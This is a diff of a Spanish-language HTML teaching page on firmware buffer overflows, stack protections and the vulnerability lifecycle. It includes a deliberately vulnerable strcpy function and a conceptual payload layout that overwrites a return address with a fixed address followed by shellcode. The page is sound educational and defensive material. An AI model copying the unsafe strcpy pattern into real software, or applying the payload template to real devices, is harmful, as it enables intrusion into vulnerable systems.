-      <p>Imagina una fila de vasos en una barra, numerados del 0 al 31. El vaso N°0 al N°7 es el buffer — solo caben 8 unidades de líquido. Los vasos N°28-31 contienen un papel con instrucciones: "después de servir, ve a la mesa 5". Si el camarero recibe 20 unidades de líquido para el vaso N°0, el exceso se derrama al N°8, N°9... y eventualmente al N°28, mojando el papel con instrucciones. El camarero ya no sabe a dónde ir — y el atacante puede reemplazar el papel con sus propias instrucciones: "ve a la cocina y abre la caja fuerte".</p>
+      <p>Vasos del 0 al 31. Los vasos 0-7 son el buffer (8 unidades). Los vasos 28-31 tienen un papel con instrucciones: "después de servir, ve a la mesa 5". Si el camarero recibe 20 unidades para el vaso 0, el exceso se derrama al 28, mojando el papel. El atacante puede reemplazar ese papel con sus propias instrucciones: "ve a la cocina y abre la caja fuerte".</p>
     </div>
 
-    <h3>Conceptos fundamentales que debes dominar</h3>
-    <div class="g2" style="margin-bottom:1.5rem;">
-      <div class="card">
-        <div class="card-label">¿Qué es un buffer?</div>
-        <p>Una zona de memoria de <strong>tamaño fijo</strong> reservada para almacenar datos temporales. Si declaras <code style="font-family:var(--mono);font-size:12px;color:var(--accent);">char nombre[64];</code> en C, el sistema reserva exactamente 64 bytes. No más, no menos. El problema ocurre cuando nadie verifica que los datos que llegan no superen esos 64 bytes.</p>
-      </div>
-      <div class="card">
-        <div class="card-label">¿Qué es la dirección de retorno?</div>
-        <p>Cuando una función A llama a una función B, el sistema guarda en el stack <strong>la dirección de memoria de A a la que debe volver B cuando termine</strong>. Esta dirección vive justo después del buffer local de B en el stack. Si la sobrescribes, controlas a dónde va el programa cuando B termina.</p>
-      </div>
-      <div class="card">
-        <div class="card-label">¿Qué es el stack?</div>
-        <p>Una región de memoria que crece hacia abajo. Guarda variables locales de las funciones, parámetros, y la dirección de retorno. Se organiza como una pila (LIFO): lo que entra último sale primero. El buffer y la dirección de retorno están en el stack — y son adyacentes en memoria.</p>
-      </div>
-      <div class="card">
-        <div class="card-label">¿Qué es el shellcode?</div>
-        <p>Código máquina cuidadosamente construido que el atacante inyecta en la memoria. Normalmente abre una shell (terminal de comandos) — de ahí el nombre. Es muy compacto y no puede contener ciertos bytes (como el byte nulo <code style="font-family:var(--mono);font-size:12px;color:var(--accent);">\x00</code>) que interrumpirían la copia de memoria.</p>
-      </div>
+    <h3>Conceptos fundamentales</h3>
+    <div class="g2" style="margin-bottom:1.25rem">
+      <div class="card"><div class="card-label">¿Qué es un buffer?</div><p>Una zona de memoria de <strong>tamaño fijo</strong>. Si declaras <code style="font-family:var(--mono);font-size:11px;color:var(--ac)">char nombre[64]</code> en C, el sistema reserva exactamente 64 bytes. El problema: nadie verifica que los datos no superen esos 64 bytes.</p></div>
+      <div class="card"><div class="card-label">¿Qué es la dirección de retorno?</div><p>Cuando la función A llama a B, el sistema guarda la <strong>dirección de memoria a la que debe volver B cuando termine</strong>. Vive justo después del buffer en el stack. Si la sobrescribes, controlas a dónde va el programa.</p></div>
+      <div class="card"><div class="card-label">¿Qué es el stack?</div><p>Región de memoria que crece hacia abajo. Guarda variables locales, parámetros y la dirección de retorno. El buffer y la dirección de retorno están en el stack — y son <strong>adyacentes en memoria</strong>.</p></div>
+      <div class="card"><div class="card-label">¿Qué es el shellcode?</div><p>Código máquina compacto que el atacante inyecta en memoria. Su objetivo clásico: abrir una shell con acceso al SO. No puede contener bytes nulos (<code style="font-family:var(--mono);font-size:11px;color:var(--ac)">\x00</code>) que interrumpirían la copia.</p></div>
     </div>
 
     <h3>Visualizador interactivo — simula el ataque paso a paso</h3>
-    <p>Haz clic en los botones para ver cómo evoluciona la memoria del stack durante un ataque real de Buffer Overflow:</p>
     <div class="mem-wrap">
       <div class="mem-title">Mapa del stack en memoria — cada celda representa 1 byte</div>
       <div class="mem-legend">
-        <span><span class="ldot ldot-n"></span>Vacío/normal</span>
-        <span><span class="ldot ldot-d"></span>Datos válidos del buffer</span>
-        <span><span class="ldot ldot-ov"></span>Overflow (datos maliciosos)</span>
-        <span><span class="ldot ldot-r"></span>Dirección de retorno</span>
-        <span><span class="ldot ldot-sh"></span>Shellcode ejecutado</span>
+        <span><span class="ldot ldot-n"></span>Vacío</span>
+        <span><span class="ldot ldot-d"></span>Datos válidos</span>
+        <span><span class="ldot ldot-ov"></span>Overflow</span>
+        <span><span class="ldot ldot-r"></span>Dir. retorno</span>
+        <span><span class="ldot ldot-sh"></span>Shellcode</span>
       </div>
       <div class="mem-grid" id="memGrid"></div>
       <div class="mem-btns">
         <button class="mbtn" onclick="mStep(0)">Reiniciar</button>
         <button class="mbtn" onclick="mStep(1)">① Estado normal</button>
-        <button class="mbtn danger" onclick="mStep(2)">② Overflow comienza</button>
+        <button class="mbtn danger" onclick="mStep(2)">② Overflow</button>
         <button class="mbtn danger" onclick="mStep(3)">③ Ret. sobrescrita</button>
-        <button class="mbtn danger" onclick="mStep(4)">④ Shellcode ejecutado</button>
+        <button class="mbtn danger" onclick="mStep(4)">④ Shellcode</button>
       </div>
       <div class="mem-msg" id="memMsg">Haz clic en los botones para simular el ataque paso a paso.</div>
     </div>
 
-    <h3>El código vulnerable — dónde y por qué ocurre</h3>
+    <h3>El código vulnerable</h3>
     <div class="steps">
       <div class="step">
         <div class="step-body">
           <h4>El programador usa funciones inseguras de C</h4>
-          <p>El lenguaje C tiene funciones heredadas de los años 70 que copian datos sin verificar el tamaño. Son convenientes pero peligrosas. En firmware se usan mucho porque C es el lenguaje estándar de desarrollo embebido.</p>
           <div class="code"><span class="k">void</span> procesar_login(<span class="k">char</span> *entrada_usuario) {
-    <span class="k">char</span> buffer[64];    <span class="c">/* solo 64 bytes reservados en el stack */</span>
-
-    <span class="hl">strcpy(buffer, entrada_usuario);</span>
-    <span class="c">/* strcpy() copia byte por byte hasta encontrar \0
-       NO verifica que los datos quepan en el buffer
-       Si entrada_usuario tiene 200 bytes → copia los 200
-       Los 136 bytes extra se escriben en memoria adyacente */</span>
-
+    <span class="k">char</span> buffer[64];
+    <span class="hl">strcpy(buffer, entrada_usuario);</span> <span class="c">/* NO verifica tamaño */</span>
     verificar_credenciales(buffer);
-    <span class="c">/* Esta línea puede que nunca se ejecute si hubo overflow */</span>
 }
-
-<span class="c">/* Función segura equivalente: */</span>
+<span class="c">/* Versión segura: */</span>
 <span class="ok">strncpy(buffer, entrada_usuario, sizeof(buffer) - 1);</span>
-<span class="ok">buffer[63] = '\0';</span>   <span class="c">/* garantiza terminador nulo */</span></div>
-          <p>La diferencia entre la versión vulnerable y la segura es una sola línea. El impacto: completo control del dispositivo.</p>
+<span class="ok">buffer[63] = '\0';</span></div>
         </div>
       </div>
-
       <div class="step">
         <div class="step-body">
-          <h4>El atacante calcula la geometría exacta de la memoria</h4>
-          <p>Para que el exploit funcione, el atacante necesita saber exactamente cuántos bytes hay entre el inicio del buffer y la dirección de retorno. Esto se hace con técnicas de fuzzing y análisis del firmware.</p>
-          <div class="code"><span class="c"># El atacante construye el payload con precisión quirúrgica:</span>
-
-payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exactamente el buffer (64 bytes)</span>
-        + <span class="s">"B"</span> * 8            <span class="c"># sobrescribir variables entre buffer y ret</span>
-        + <span class="hl">"\x40\x11\x05\x08"</span> <span class="c"># nueva dirección de retorno → apunta al shellcode</span>
-        + shellcode           <span class="c"># el código malicioso que se ejecutará</span>
-
-<span class="c"># En firmware sin ASLR, las direcciones son SIEMPRE las mismas
-# El atacante las calcula una vez y el exploit funciona en todos
-# los dispositivos del mismo modelo con la misma versión de firmware</span></div>
+          <h4>El atacante construye el payload con precisión</h4>
+          <div class="code">payload = <span class="s">"A"</span> * 64           <span class="c"># llenar el buffer</span>
+        + <span class="s">"B"</span> * 8            <span class="c"># sobrescribir variables intermedias</span>
+        + <span class="hl">"\x40\x11\x05\x08"</span> <span class="c"># nueva dirección de retorno → shellcode</span>
+        + shellcode
+<span class="c"># Sin ASLR: las direcciones son SIEMPRE las mismas
+# El exploit funciona en TODOS los dispositivos del mismo modelo</span></div>
         </div>
       </div>
-
       <div class="step">
         <div class="step-body">
           <h4>La función retorna y salta al shellcode</h4>
-          <p>Cuando <code style="font-family:var(--mono);font-size:12px;color:var(--accent);">procesar_login()</code> termina, el procesador lee la dirección de retorno del stack y salta ahí. Pero esa dirección ahora apunta al shellcode del atacante. El shellcode se ejecuta con los permisos del proceso del firmware — que casi siempre es root.</p>
-          <div class="note" style="margin-top:.75rem;">
+          <p>El procesador lee la dirección de retorno manipulada y ejecuta el shellcode con permisos del proceso del firmware — casi siempre root.</p>
+          <div class="note">
             <div class="note-label">¿POR QUÉ EN FIRMWARE ES TAN EFECTIVO?</div>
-            <p>En un PC con Windows o Linux moderno, explotar un buffer overflow es difícil porque hay múltiples protecciones que lo complican (ASLR hace las direcciones aleatorias, DEP impide ejecutar shellcode en el stack). En firmware, estas protecciones <strong>generalmente no existen</strong> — lo verás en la siguiente pestaña.</p>
+            <p>En un PC moderno, ASLR aleatoriza las direcciones y DEP impide ejecutar shellcode en el stack. En firmware, estas protecciones <strong>generalmente no existen</strong>.</p>
           </div>
         </div>
       </div>
@@ -625,146 +512,103 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
 
   <!-- PROTECCIONES -->
   <div class="vpanel" id="v-prot">
-    <p>Los sistemas operativos modernos tienen varias capas de defensa que hacen que explotar un buffer overflow sea muy difícil. El firmware de routers y firewalls <strong>frecuentemente carece de todas ellas</strong>. Esto es lo que las hace tan importantes — y su ausencia, tan peligrosa.</p>
-
-    <div class="card" style="margin-top:1rem;">
+    <p>Los SO modernos tienen varias capas de defensa que hacen que explotar un buffer overflow sea muy difícil. El firmware de routers y firewalls <strong>frecuentemente carece de todas ellas</strong>.</p>
+    <div class="card" style="margin-top:1rem">
       <div class="prot-row">
         <div class="prot-left">
           <div class="prot-name">ASLR</div>
           <div class="prot-full">Address Space Layout Randomization — Aleatorización del espacio de direcciones</div>
           <div class="prot-exp">
-            <h4 style="font-size:14px;margin-top:.6rem;">¿Qué hace?</h4>
-            <p>Cada vez que el sistema arranca, las funciones, bibliotecas y el stack se cargan en <strong>posiciones de memoria completamente aleatorias</strong>. Ayer el buffer de la función de login estaba en la dirección 0x0804a020, hoy está en 0xb7e34f10.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué protege contra Buffer Overflow?</h4>
-            <p>Para que el exploit funcione, el atacante necesita saber <em>exactamente</em> la dirección de retorno y dónde poner el shellcode. Con ASLR, esas direcciones son aleatorias — el exploit que funcionó ayer no funciona hoy. El atacante necesitaría adivinar entre millones de posibilidades.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué el firmware no lo tiene?</h4>
-            <p>ASLR requiere soporte del sistema operativo y del compilador. El firmware se compila para garantizar un arranque determinista y rápido — las mismas direcciones siempre. En dispositivos embebidos, la variabilidad es un problema de funcionamiento, no de seguridad. El resultado: las direcciones de memoria son siempre las mismas. El atacante las calcula una vez y el exploit funciona en todos los dispositivos del mismo modelo.</p>
+            <p>Cada arranque, las funciones y el stack se cargan en <strong>posiciones de memoria completamente aleatorias</strong>. El exploit que funcionó ayer no funciona hoy — el atacante necesitaría adivinar entre millones de posibilidades.</p>
+            <p><em>¿Por qué el firmware no lo tiene?</em> Se compila para garantizar un arranque determinista y rápido — las mismas direcciones siempre. Sin ASLR, las direcciones son predecibles: el atacante las calcula una vez y el exploit funciona en todos los dispositivos del mismo modelo.</p>
           </div>
         </div>
-        <div class="prot-badges">
-          <span class="badge b-green">Windows / Mac / Linux ✓</span>
-          <span class="badge b-red">Firmware típico ✗</span>
-        </div>
+        <div class="prot-badges"><span class="badge b-green">Windows / Mac / Linux ✓</span><span class="badge b-red">Firmware típico ✗</span></div>
       </div>
-
       <div class="prot-row">
         <div class="prot-left">
           <div class="prot-name">DEP / NX</div>
-          <div class="prot-full">Data Execution Prevention / No-Execute Bit — Prevención de ejecución de datos</div>
+          <div class="prot-full">Data Execution Prevention — Prevención de ejecución de datos</div>
           <div class="prot-exp">
-            <h4 style="font-size:14px;margin-top:.6rem;">¿Qué hace?</h4>
-            <p>Marca las páginas de memoria que contienen <strong>datos como no ejecutables</strong>. El stack (donde vive el buffer y el shellcode inyectado) es memoria de datos — no debería ejecutarse como código.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué protege?</h4>
-            <p>Si el atacante inyecta shellcode en el buffer del stack y redirige la ejecución hacia allí, el procesador detecta que esa página está marcada como "no ejecutable" y lanza una excepción: acceso denegado. El shellcode no puede correr.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué el firmware no lo tiene?</h4>
-            <p>Requiere soporte en hardware (el "bit NX" en procesadores Intel/AMD, o el "bit XN" en ARM). Muchos procesadores de bajo costo en routers (MIPS antiguo, ARM sin extensiones de seguridad) no implementan este bit. Y aunque el hardware lo soporte, el firmware necesita activarlo explícitamente al configurar la memoria — algo que muchos firmwares no hacen.</p>
+            <p>Marca las páginas de memoria que contienen datos como <strong>no ejecutables</strong>. Si el atacante inyecta shellcode en el buffer del stack, el procesador detecta que esa página está marcada como no ejecutable y lanza una excepción.</p>
+            <p><em>¿Por qué el firmware no lo tiene?</em> Requiere soporte hardware (bit NX en Intel/AMD, bit XN en ARM). Muchos procesadores de bajo costo en routers no lo implementan, y aunque lo soporten, el firmware necesita activarlo explícitamente.</p>
           </div>
         </div>
-        <div class="prot-badges">
-          <span class="badge b-green">Windows / Mac / Linux ✓</span>
-          <span class="badge b-red">Firmware típico ✗</span>
-        </div>
+        <div class="prot-badges"><span class="badge b-green">Windows / Mac / Linux ✓</span><span class="badge b-red">Firmware típico ✗</span></div>
       </div>
-
       <div class="prot-row">
         <div class="prot-left">
           <div class="prot-name">Stack Canaries</div>
-          <div class="prot-full">Valores centinela en el stack (también llamado Stack Protector)</div>
+          <div class="prot-full">Valores centinela en el stack (Stack Protector)</div>
           <div class="prot-exp">
-            <h4 style="font-size:14px;margin-top:.6rem;">¿Qué hace?</h4>
-            <p>El compilador inserta un <strong>valor aleatorio secreto</strong> (el "canario") en el stack, justo antes de la dirección de retorno. Antes de que la función retorne, verifica que ese valor no haya cambiado. Si el buffer overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — la verificación falla y el programa termina antes de ejecutar shellcode.</p>
-            <div class="code" style="font-size:11px;margin:.75rem 0;"><span class="c">/* Con stack canary (lo agrega el compilador automáticamente) */</span>
-<span class="k">void</span> procesar_login(<span class="k">char</span> *entrada) {
-    <span class="acc">uint32_t canary = __stack_chk_guard;</span>  <span class="c">← insertado por el compilador</span>
-    <span class="k">char</span> buffer[64];
-    strcpy(buffer, entrada);
-    <span class="acc">if (canary != __stack_chk_guard) __stack_chk_fail();</span>  <span class="c">← si cambió, abortar</span>
-    <span class="k">return</span>;  <span class="c">← solo llega aquí si el canario está intacto</span>
-}</div>
-            <h4 style="font-size:14px;margin-top:.5rem;">El nombre "canario"</h4>
-            <p>Viene de los canarios que los mineros llevaban a las minas de carbón. Si había gas tóxico, el canario moría primero — alertando a los mineros. El canario en el stack "muere" (se corrompe) cuando hay un overflow, alertando al programa.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué el firmware rara vez lo tiene?</h4>
-            <p>Requiere compilar el firmware con el flag <code style="font-family:var(--mono);font-size:11px;color:var(--accent);">-fstack-protector</code> de GCC. Muchos fabricantes compilan sin esta opción para reducir el tamaño del binario y mejorar el rendimiento. Es una optimización que sacrifica seguridad.</p>
+            <p>El compilador inserta un <strong>valor aleatorio secreto</strong> justo antes de la dirección de retorno. Antes de que la función retorne, verifica que no haya cambiado. Si el overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — el programa termina antes de ejecutar shellcode.</p>
+            <div class="code" style="font-size:10px"><span class="acc">uint32_t canary = __stack_chk_guard;</span>  <span class="c">← insertado por el compilador</span>
+<span class="k">char</span> buffer[64];
+strcpy(buffer, entrada);
+<span class="acc">if (canary != __stack_chk_guard) __stack_chk_fail();</span> <span class="c">← si cambió, abortar</span></div>
+            <p><em>El nombre:</em> viene de los canarios que los mineros llevaban a las minas de carbón. Si había gas tóxico, el canario moría primero alertando a los mineros.</p>
           </div>
         </div>
-        <div class="prot-badges">
-          <span class="badge b-green">Windows / Mac / Linux ✓</span>
-          <span class="badge b-yellow">Firmware: muy raro</span>
-        </div>
+        <div class="prot-badges"><span class="badge b-green">Windows / Mac / Linux ✓</span><span class="badge b-yellow">Firmware: muy raro</span></div>
       </div>
-
       <div class="prot-row">
         <div class="prot-left">
           <div class="prot-name">Secure Boot</div>
           <div class="prot-full">Arranque seguro — verificación de integridad del firmware</div>
           <div class="prot-exp">
-            <h4 style="font-size:14px;margin-top:.6rem;">¿Qué hace?</h4>
-            <p>Antes de ejecutar el firmware, el hardware verifica su <strong>firma digital criptográfica</strong>. Si alguien modificó el firmware (instalando un backdoor, por ejemplo), la firma no coincide y el dispositivo no arranca — o arranca en modo de recuperación.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué es importante?</h4>
-            <p>Sin Secure Boot, un atacante que compromete el dispositivo puede reemplazar el firmware por uno modificado que incluya backdoors permanentes — incluso un reinicio de fábrica no lo elimina porque el firmware malicioso ya está en el chip.</p>
-            <h4 style="font-size:14px;margin-top:.75rem;">¿Por qué el firmware rara vez lo tiene?</h4>
-            <p>Requiere hardware especial (chip TPM, eFuse programable) y que toda la cadena de arranque esté firmada con claves criptográficas del fabricante. Añade costo y complejidad al hardware. Los dispositivos de gama baja y media generalmente no lo implementan.</p>
+            <p>Antes de ejecutar el firmware, el hardware verifica su <strong>firma digital criptográfica</strong>. Si alguien lo modificó (instalando un backdoor), la firma no coincide y el dispositivo no arranca.</p>
+            <p><em>¿Por qué el firmware rara vez lo tiene?</em> Requiere hardware especial (chip TPM) y toda la cadena de arranque firmada con claves del fabricante. Añade costo. Los dispositivos de gama baja y media generalmente no lo implementan.</p>
           </div>
         </div>
-        <div class="prot-badges">
-          <span class="badge b-green">PC / Mac ✓</span>
-          <span class="badge b-red">Firmware: muy raro</span>
-        </div>
+        <div class="prot-badges"><span class="badge b-green">PC / Mac ✓</span><span class="badge b-red">Firmware: muy raro</span></div>
       </div>
     </div>
 
     <div class="important">
       <div class="important-label">CONCLUSIÓN: EL FIRMWARE ES EL BLANCO PERFECTO</div>
-      <p>Sin ASLR las direcciones son predecibles. Sin DEP/NX el shellcode puede ejecutarse en el stack. Sin stack canaries el overflow no se detecta. Sin Secure Boot el firmware comprometido persiste. La combinación de estas ausencias convierte al firmware en el objetivo ideal para un atacante sofisticado.</p>
+      <p>Sin ASLR las direcciones son predecibles. Sin DEP/NX el shellcode puede ejecutarse en el stack. Sin stack canaries el overflow no se detecta. Sin Secure Boot el firmware comprometido persiste. Esta combinación convierte al firmware en el objetivo ideal para un atacante sofisticado.</p>
     </div>
   </div>
 
   <!-- COMPARATIVA -->
   <div class="vpanel" id="v-comp">
     <h3>¿RCE y Buffer Overflow son lo mismo? No exactamente.</h3>
-    <p>Son conceptos relacionados pero en niveles distintos. La confusión es común — aquí la aclaración definitiva:</p>
-
-    <div class="g2" style="margin:1rem 0 1.5rem;">
+    <div class="g2" style="margin:1rem 0 1.25rem">
       <div class="card accent">
         <div class="card-label">RCE — Es un resultado / impacto</div>
-        <p>Describe <strong>qué logró el atacante</strong>: ejecutar código remotamente. No dice cómo lo hizo. Puede lograrse mediante buffer overflow, inyección de comandos, deserialización insegura, vulnerabilidades en parsers de XML/JSON, etc.</p>
-        <br>
-        <p>Es como decir "el atacante entró al edificio" — es el resultado, no el método.</p>
-        <br><span class="badge b-blue">TIPO: Clase de impacto</span>
+        <p>Describe <strong>qué logró el atacante</strong>: ejecutar código remotamente. No dice cómo lo hizo. Puede lograrse mediante buffer overflow, inyección de comandos, deserialización insegura, etc.</p>
+        <p style="margin-top:.5rem">Es como decir "el atacante entró al edificio" — es el resultado, no el método.</p>
+        <span class="badge b-blue">TIPO: Clase de impacto</span>
       </div>
       <div class="card yellow">
-        <div class="card-label" style="color:var(--yellow);">Buffer Overflow — Es una técnica / mecanismo</div>
-        <p>Describe <strong>cómo lo hizo</strong>: desbordó un buffer para sobrescribir la memoria. Es uno de los métodos que puede llevar a RCE, pero también puede causar crashes del sistema (DoS) o corrupción de datos sin llegar a ejecución de código.</p>
-        <br>
-        <p>Es como decir "entró por la ventana rota" — es el método específico.</p>
-        <br><span class="badge b-yellow">TIPO: Técnica de ataque</span>
+        <div class="card-label" style="color:var(--yl)">Buffer Overflow — Es una técnica</div>
+        <p>Describe <strong>cómo lo hizo</strong>: desbordó un buffer para sobrescribir la memoria. Puede llevar a RCE, pero también puede causar solo un crash (DoS).</p>
+        <p style="margin-top:.5rem">Es como decir "entró por la ventana rota" — es el método específico.</p>
+        <span class="badge b-yellow">TIPO: Técnica de ataque</span>
       </div>
     </div>
-
     <div class="note">
       <div class="note-label">LA RELACIÓN ENTRE AMBOS</div>
-      <p>Buffer Overflow → sobrescribe dirección de retorno → redirige ejecución al shellcode → el shellcode corre → <strong>eso es RCE</strong>. El Buffer Overflow es el <em>cómo</em>; el RCE es el <em>qué logró</em>. Un buffer overflow bien construido casi siempre lleva a RCE.</p>
+      <p>Buffer Overflow → sobrescribe dirección de retorno → redirige al shellcode → el shellcode corre → <strong>eso es RCE</strong>. El Buffer Overflow es el <em>cómo</em>; el RCE es el <em>qué logró</em>.</p>
     </div>
-
     <table class="stbl">
       <thead><tr><th>Aspecto</th><th>RCE</th><th>Buffer Overflow</th></tr></thead>
       <tbody>
         <tr><td>Naturaleza</td><td>Impacto / resultado</td><td>Técnica de explotación</td></tr>
-        <tr><td>¿Cómo se logra?</td><td>Con múltiples técnicas (BOF, inyección, etc.)</td><td>Desbordando un buffer en memoria</td></tr>
-        <tr><td>¿Siempre da RCE?</td><td>Sí, por definición</td><td>No siempre — puede dar solo crash (DoS)</td></tr>
+        <tr><td>¿Cómo se logra?</td><td>Con múltiples técnicas</td><td>Desbordando un buffer</td></tr>
+        <tr><td>¿Siempre da RCE?</td><td>Sí, por definición</td><td>No — puede dar solo DoS</td></tr>
         <tr><td>¿Requiere acceso físico?</td><td>No — por red</td><td>No — por entrada de datos</td></tr>
-        <tr><td>Dificultad</td><td>Variable según técnica</td><td>Alta — requiere conocimiento preciso de memoria</td></tr>
-        <tr><td>Protecciones específicas</td><td>Depende de la técnica</td><td>ASLR, DEP, Stack Canaries</td></tr>
+        <tr><td>Protecciones</td><td>Depende de la técnica</td><td>ASLR, DEP, Stack Canaries</td></tr>
       </tbody>
     </table>
   </div>
 </section>
 
-<!-- ═══════════════════════════ SECCIÓN 3 ═══════════════════════════ -->
+<!-- ═══ SECCIÓN 3: CICLO DE VIDA ═══ -->
 <section class="section" id="s3">
   <div class="s-num">DIAPOSITIVA 2.3</div>
   <h2 class="s-title">El Ciclo de Vida de la Vulnerabilidad</h2>
-  <p class="s-lead">Una vulnerabilidad tiene un ciclo de vida desde que nace hasta que (si acaso) desaparece. Entender cada fase es clave para saber cuándo y cómo ocurren los ataques — y por qué son tan difíciles de prevenir. Haz clic en cada fase.</p>
+  <p class="s-lead">Una vulnerabilidad tiene un ciclo de vida desde que nace hasta que (si acaso) desaparece. Entender cada fase es clave para saber cuándo y cómo ocurren los ataques. Haz clic en cada fase.</p>
 
   <div class="timeline">
 
@@ -773,31 +617,16 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
       <button class="tl-trigger">
         <div class="tl-phase">FASE 1</div>
         <div class="tl-name">Introducción del fallo en el código</div>
-        <span class="tl-hint">▶ clic para expandir y ver detalles</span>
+        <span class="tl-hint">▶ clic para expandir</span>
       </button>
       <div class="tl-body">
-        <h4>¿Qué ocurre exactamente?</h4>
-        <p>Un desarrollador escribe código con un error de programación. En el contexto de firmware, suele ser algo aparentemente pequeño: usar una función C insegura, no validar el tamaño de los datos de entrada, asumir que el usuario siempre mandará datos válidos.</p>
-        <div class="code"><span class="c">/* El desarrollador escribe esto — parece inofensivo */</span>
-<span class="k">void</span> handle_username(<span class="k">char</span> *input) {
+        <p>Un desarrollador escribe código con un error de programación — usar una función C insegura, no validar el tamaño de los datos de entrada, asumir que el usuario siempre mandará datos válidos.</p>
+        <div class="code"><span class="k">void</span> handle_username(<span class="k">char</span> *input) {
     <span class="k">char</span> buf[32];
     <span class="hl">strcpy(buf, input);</span>  <span class="c">/* ← aquí nace la vulnerabilidad */</span>
     autenticar(buf);
-}
-
-<span class="c">/* Versión segura que debería haber usado: */</span>
-<span class="k">void</span> handle_username(<span class="k">char</span> *input) {
-    <span class="k">char</span> buf[32];
-    <span class="ok">strncpy(buf, input, sizeof(buf) - 1);</span>
-    <span class="ok">buf[31] = '\0';</span>
-    autenticar(buf);
 }</div>
-        <h4>¿Por qué ocurre tan frecuentemente?</h4>
-        <p>El firmware se desarrolla bajo presiones: plazos ajustados, presupuestos limitados, prioridad en funcionalidad sobre seguridad. El lenguaje C no tiene protecciones automáticas — el compilador no avisa si usas strcpy de forma peligrosa. Y en firmware, el código puede ser heredado de proyectos de hace 15 años donde la seguridad no era una prioridad.</p>
-        <div class="note">
-          <div class="note-label">TIEMPO DE VIDA LATENTE</div>
-          <p>El fallo puede vivir en el código durante <strong>años sin que nadie lo note</strong>. El dispositivo funciona perfectamente — procesa tráfico, aplica reglas, autentica usuarios. No hay ningún síntoma. Es como una grieta microscópica en la base de un puente — todo parece bien hasta que alguien la encuentra o hasta que falla.</p>
-        </div>
+        <div class="note"><div class="note-label">TIEMPO DE VIDA LATENTE</div><p>El fallo puede vivir en el código durante <strong>años sin que nadie lo note</strong>. El dispositivo funciona perfectamente — no hay ningún síntoma visible.</p></div>
       </div>
     </div>
 
@@ -809,25 +638,16 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
         <span class="tl-hint">▶ clic para expandir</span>
       </button>
       <div class="tl-body">
-        <h4>¿Cómo se descubren estas vulnerabilidades?</h4>
-        <p>Los investigadores descargan el firmware del sitio del fabricante, lo extraen con herramientas como <strong>binwalk</strong>, y analizan el código máquina con descompiladores como <strong>Ghidra</strong> (de la NSA, gratuito) o IDA Pro. También usan <strong>fuzzing</strong> — enviar miles de entradas aleatorias a la interfaz web del dispositivo para ver cuáles causan comportamiento inesperado (crashes, respuestas anómalas).</p>
-
-        <div class="g2" style="margin:.75rem 0;">
+        <p>Los investigadores descargan el firmware, lo extraen con <strong>binwalk</strong>, y analizan el código máquina con <strong>Ghidra</strong> o IDA Pro. También usan <strong>fuzzing</strong> — enviar miles de entradas aleatorias para ver cuáles causan comportamiento inesperado.</p>
+        <div class="g2" style="margin:.75rem 0">
           <div class="card green">
-            <div class="card-label" style="color:var(--green);">White Hat — El investigador ético</div>
-            <p>Empresa de ciberseguridad, investigador independiente, o programa de Bug Bounty. Lo descubre y lo reporta al fabricante de forma privada (<em>responsible disclosure</em>). Le da un plazo razonable (generalmente 90 días) para publicar el parche antes de revelar el fallo públicamente.</p>
-            <p style="margin-top:.5rem;"><strong style="color:var(--green);">Resultado:</strong> el fabricante puede arreglarlo antes de que los atacantes lo exploten masivamente.</p>
+            <div class="card-label" style="color:var(--gr)">White Hat — Investigador ético</div>
+            <p>Lo descubre y lo reporta al fabricante de forma privada (<em>responsible disclosure</em>). Le da un plazo de <strong>90 días</strong> para publicar el parche antes de revelar el fallo. Resultado: el fabricante puede arreglarlo antes de ataques masivos.</p>
           </div>
           <div class="card red">
-            <div class="card-label" style="color:var(--red);">Black Hat — El actor malicioso</div>
-            <p>Criminales, grupos de hackers patrocinados por estados, o brokers de exploits. No reportan nada al fabricante. Guardan el fallo para explotarlo, lo venden en mercados clandestinos (donde los zero-days se cotizan en cientos de miles de dólares), o lo comparten con grupos de ataque.</p>
-            <p style="margin-top:.5rem;"><strong style="color:var(--red);">Resultado:</strong> el fabricante no sabe nada. Entramos en la Fase 3.</p>
+            <div class="card-label" style="color:var(--red)">Black Hat — Actor malicioso</div>
+            <p>No reporta nada. Guarda el fallo para explotarlo, lo vende en mercados clandestinos (zero-days se cotizan en cientos de miles de dólares), o lo comparte con grupos de ataque. Resultado: el fabricante no sabe nada → Fase 3.</p>
           </div>
-        </div>
-
-        <div class="important">
-          <div class="important-label">EL MOMENTO QUE LO CAMBIA TODO</div>
-          <p>Si fue un black hat quien lo descubrió primero, el fabricante no sabe nada. El atacante tiene ventaja total — conoce el fallo, puede explotarlo a voluntad, y nadie puede defenderse. Esto lleva directamente a la fase más peligrosa del ciclo.</p>
         </div>
       </div>
     </div>
@@ -835,43 +655,23 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
     <div class="tl-item p-danger" onclick="tlToggle(this)">
       <div class="tl-dot"></div>
       <button class="tl-trigger">
-        <div class="tl-phase" style="color:var(--red);">FASE 3 — LA MÁS PELIGROSA</div>
-        <div class="tl-name" style="color:var(--red);">Zero-Day Window — La ventana de ventaja total</div>
+        <div class="tl-phase" style="color:var(--red)">FASE 3 — LA MÁS PELIGROSA</div>
+        <div class="tl-name" style="color:var(--red)">Zero-Day Window — La ventana de ventaja total</div>
         <span class="tl-hint">▶ clic para expandir</span>
       </button>
       <div class="tl-body">
         <div class="important">
           <div class="important-label">¿QUÉ SIGNIFICA "ZERO-DAY"?</div>
-          <p>El nombre viene de "zero days to fix" — el fabricante tiene <strong>cero días para arreglarlo</strong> porque no sabe que existe. Es la ventana de tiempo entre que el fallo es descubierto por un actor malicioso y que el fabricante se entera. Durante todo este tiempo, el atacante opera con ventaja absoluta.</p>
+          <p>"Zero days to fix" — el fabricante tiene <strong>cero días para arreglarlo</strong> porque no sabe que existe. Es la ventana entre que el fallo es descubierto por un actor malicioso y que el fabricante se entera.</p>
         </div>
-
